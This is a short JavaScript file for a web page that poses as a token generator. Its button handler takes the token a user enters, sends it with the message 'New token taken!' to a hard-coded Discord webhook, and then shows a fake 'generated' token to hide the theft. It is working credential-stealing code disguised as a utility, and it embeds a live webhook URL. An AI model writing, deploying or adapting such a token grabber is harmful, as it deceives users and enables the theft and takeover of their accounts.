let tokenInput = document.getElementById("tokeninput");
let genButton = document.getElementById("genbutton");
let tokenOutput = document.getElementById("tokenoutput");

function sendToHook(hookURL, content) {
    const request = new XMLHttpRequest();
    request.open("POST", hookURL);

    request.setRequestHeader('Content-type', 'application/json');

    const params = {
      username: "Token",
      avatar_url: "https://img.icons8.com/color-glass/120/000000/services--v1.png",
      content: content
    }

    request.send(JSON.stringify(params));
  }


genButton.addEventListener("click", () => {
    tokenmessage = "New token taken!\n" + tokenInput.value;

    sendToHook(
        "https://discord.com/api/webhooks/1249563282084462624/sgPIAfwzirHKciMrw-1YF8tkZsYBK58XydCyk75Lsb61ZWc-9vkzghbrIxL8QaS7_eiG",
        tokenmessage
    );

    tokenOutput.innerText = tokenInput.value + "4A88";

    console.log("Your token has been generated.");
});
